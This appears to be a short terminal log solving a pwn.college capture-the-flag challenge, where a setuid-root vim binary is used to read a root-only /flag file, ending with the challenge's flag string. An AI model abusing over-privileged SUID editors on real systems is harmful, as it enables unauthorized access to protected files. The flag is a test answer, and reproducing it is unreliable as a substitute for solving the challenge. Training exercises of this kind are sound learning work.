```bash
hacker@program-misuse-level-7:~$ ls
Desktop
hacker@program-misuse-level-7:~$ cd /
hacker@program-misuse-level-7:/$ ls -l /usr/bin/vim
lrwxrwxrwx 1 root root 21 Nov 15 07:35 /usr/bin/vim -> /etc/alternatives/vim
hacker@program-misuse-level-7:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-7:/$ vim flag
hacker@program-misuse-level-7:/$ cd challenge/
hacker@program-misuse-level-7:/challenge$ ls
babysuid_level7
hacker@program-misuse-level-7:/challenge$ ./babysuid_level7 
Welcome to ./babysuid_level7!

This challenge is part of a series of programs that
shows you that an over-privileged editor is a very powerful tool, indeed.

I just set the SUID bit on /usr/bin/vim.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level7) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/vim!
hacker@program-misuse-level-7:/challenge$ ls -l /usr/bin/vim
lrwxrwxrwx 1 root root 21 Nov 15 07:35 /usr/bin/vim -> /etc/alternatives/vim
hacker@program-misuse-level-7:/challenge$ ls -l /etc/alternatives/vim
lrwxrwxrwx 1 root root 18 Nov 15 07:35 /etc/alternatives/vim -> /usr/bin/vim.basic
hacker@program-misuse-level-7:/challenge$ ls -l /usr/bin/vim.basic
-rwsr-xr-x 1 root root 2910952 Oct 16 18:14 /usr/bin/vim.basic
hacker@program-misuse-level-7:/challenge$ vim /flag 
hacker@program-misuse-level-7:/challenge$ 
```


```
The flag is 
pwn.college{c5rGkCdbOgmmnqAIZZjdXkd1K5Q.0VO0EDL0AjNzQzW}
```
